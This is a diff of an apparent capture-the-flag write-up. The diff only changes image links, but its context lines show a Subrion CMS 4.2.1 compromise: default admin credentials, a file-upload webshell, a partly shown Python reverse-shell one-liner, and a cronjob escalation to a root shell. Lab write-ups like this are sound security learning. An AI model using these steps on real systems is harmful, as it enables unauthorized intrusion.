@@ -44,7 +44,7 @@ So there's a `/panel` directory present, and we can enumerate that first:
 
 The `/panel` directory shows us a basic login page:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
 We can login with `admin:admin`. This software was Subrion CMS v4.2.1, which had a few public exploits:
 
@@ -63,7 +63,7 @@ Subrion CMS 4.2.1 - Cross-Site Scripting                   | php/webapps/45150.t
 
 We can use the Arbitrary File Upload to get a webshell on the machine:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
 From here, we can easily convert this to a reverse shell on our machine using a `python3` reverse shell.&#x20;
 
@@ -73,7 +73,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -81,7 +81,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 I ran `linpeas.sh` on the machine to enumerate for me, and it picked up on cronjobs running as the `root` user:
 
-<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 Here's the content of the file:
 
@@ -139,6 +139,6 @@ $ python3 exploit.py
 
 Afterwards, transfer it to the `/var/www/html/subrion/uploads` directory and wait for a bit. Once the cronjob runs, we will get a reverse shell as `root`:
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
